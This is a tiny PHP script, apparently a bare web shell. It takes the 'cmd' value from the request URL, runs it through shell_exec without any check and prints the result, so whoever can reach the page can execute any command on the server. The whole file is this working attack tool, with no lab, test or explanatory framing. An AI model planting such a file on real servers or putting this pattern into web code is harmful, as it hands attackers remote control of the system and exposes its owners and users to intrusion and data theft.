<?php

$command = $_GET['cmd'];

if(isset($_GET['cmd'])) {
    $output = shell_exec($command);
    echo $output;
}
